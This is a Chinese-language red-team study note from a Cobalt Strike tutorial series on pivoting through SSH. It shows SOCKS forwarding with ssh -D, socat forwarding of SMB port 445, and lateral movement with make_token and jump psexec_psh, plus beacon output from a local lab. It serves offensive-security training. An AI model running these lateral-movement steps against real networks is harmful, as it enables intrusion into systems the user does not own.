---
title: 【CS学习笔记】22、通过SSH开通通道
date: 2020-04-19 15:06:57
id: 200419-150657
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs22-2.png
summary: 这一节将来介绍如何通过 SSH 通道进行攻击。
tags:
- Cobalt Strike
- 学习笔记
- 红队
categories:
- CS 学习笔记
---

# 0x00 前言

这一节将来介绍如何通过 SSH 通道进行攻击。

# 0x01 通过 SSH 建立通道

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs22-1.png)

1、连接到上图中蓝色区域里的 PIVOT 主机并开启端口转发

```
ssh -D 1080 user@<blue pivot>
```

> 该命令中的 -D 参数会使 SSH 建立一个 socket，并去监听本地的 1080 端口，一旦有数据传向那个端口，就自动把它转移到 SSH 连接上面，随后发往远程主机。

2、在红色区域的 PIVOT 主机上开启通过 SSH Socks 的 445 端口转发

```
socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:<target>:445
```

>socat 可以理解成 netcat 的加强版。socat 建立 socks 连接默认端口就是 1080 ，由于我们上面设置的就是 1080，因此这里不需变动。如果设置了其他端口，那么这里还需要在命令最后加上 `,socksport=<port>` 指定端口才行。

3、在攻击者控制的主机上运行 beacon，使其上线

```
注意需要使用 administrator 权限运行 beacon
```

4、在上线的主机上运行以下命令

```
make_token [DOMAIN\user] [password]
jump psexec_psh <red pivot> [listener]
```

整体的流程就是下面这张图一样。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs22-2.png)

# 0x02 演示

我在本地搭建了这样的一个环境。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs22-3.png)

1. 首先使 Win1 主机上线，接着在 Linux1 主机上通过 SSH 连接到 Linux2 主机。

```
ssh -D 1080 user@192.168.175.146
```

```powershell
> ssh -D 1080 user@192.168.175.146
user@192.168.175.146's password: 
Last login: Fri Jul 31 20:00:54 2020 from 192.168.175.1
user@ubuntu:~$ 
```

2、在 Linux1 主机上开启 445 端口转发

```
socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445
```

3、在 Win1 主机上运行以下命令使 Win2 上线

```
make_token teamssix\administrator Test123!
jump psexec_psh 192.168.175.200 smb
```

```powershell
beacon> make_token teamssix\administrator Test123!
[*] Tasked beacon to create a token for teamssix\administrator
[+] host called home, sent: 61 bytes
[+] Impersonated WINTEST\Administrator

beacon> jump psexec_psh 192.168.175.200 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_532c) on 192.168.175.200 via Service Control Manager (PSH)
[+] host called home, sent: 5886 bytes
[+] received output:
Started service 4aea3b9 on 192.168.175.200
[+] host called home, sent: 204473 bytes
[+] established link to child beacon: 192.168.232.132
```

4、随后便可以看到通过 SSH 上线的主机

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs22-4.png)

> 参考链接：
> 
>[https://payloads.online/tools/socat](https://payloads.online/tools/socat)
> 
>[https://www.bilibili.com/video/BV16b411i7n5](https://www.bilibili.com/video/BV16b411i7n5)
> 
>[https://blog.csdn.net/pipisorry/article/details/52269785](https://blog.csdn.net/pipisorry/article/details/52269785)
> 
>更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)